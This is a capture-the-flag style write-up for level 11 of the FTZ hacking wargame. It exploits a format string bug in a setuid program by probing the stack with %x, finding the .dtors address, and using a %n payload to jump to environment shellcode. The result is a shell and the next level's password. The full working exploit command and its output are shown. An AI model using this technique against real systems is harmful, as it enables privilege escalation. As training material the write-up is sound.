# Level11

## This level's goal

- FSB(Format String Bug)
- Shell code

***

```
[level11@ftz level11]$ ls -l
total 28
-rwsr-x---    1 level12  level11     13733 Mar  8  2003 attackme
-rw-r-----    1 root     level11       168 Mar  8  2003 hint
drwxr-xr-x    2 root     level11      4096 Feb 24  2002 public_html
drwxrwxr-x    2 root     level11      4096 Jan 14  2009 tmp

[level11@ftz level11]$ cat hint

#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[] )
{
        char str[256];

        setreuid( 3092, 3092 );
        strcpy( str, argv[1] );
        printf( str );
}
```

The hint seems the vulnerability of FSB and BOF   
I will exploit with FSB

```
[level11@ftz level11]$ ./attackme
Segmentation fault
```

This seems that Segmentation falut will be printed if there is no argument and then the argv[1] is the value of garbage.

```
[level11@ftz level11]$ ./attackme "AAAA"
AAAA
[level11@ftz level11]$ ./attackme "AAAA %x"
AAAA bffffc40
[level11@ftz level11]$ ./attackme "AAAA %x %x"
AAAA bffffc3d bffff300
[level11@ftz level11]$ ./attackme "AAAA %x %x %x"
AAAA bffffc3a bfffdb80 1
[level11@ftz level11]$ ./attackme "AAAA %x %x %x %x"
AAAA bffffc37 bfffde00 1 41414141
```

AAAA means 41414141

```
[level11@ftz level11]$ nm attackme
08049610 d __DTOR_END__

[level11@ftz tmp]$ ./egg
Using address: 0xbfffe988

[level11@ftz tmp]$ ./getenv
SUPERDK's addr=0xbffff49d
```
the attack code format   
`/home/level11/attackme $(printf "AAAAAddress1BBBBAddress2")%8x%8x%8x%Value1c%n%Value2c%n`

Address1 : \x10\x96\x04\x08(08049610)   
Address2(Address+1) : \x12\x96\x04\x08(08049612)   

0xbffff49d will be (Value2/Value1) cuz this will be inverted when you input   
value1 : f49d - 40 = 62621(f49d) - 40 = 62581   
value2 : 1bfff-f49d = 114687(1bfff) - 62621(f49d) = 52066

So, the attack code is   
`/home/level11/attackme $(printf "AAAA\x10\x96\x04\x08BBBB\x12\x96\x04\x08")%8x%8x%8x%62581c%n%52066c%n`

```
[level11@ftz level11]$ ./attackme $(printf "AAAA\x10\x96\x04\x08BBBB\x12\x96\x04\x08")%8x%8x%8x%62581c%n%52066c%n

sh-2.05b$ my-pass

Level12 Password is "it is like this".
```
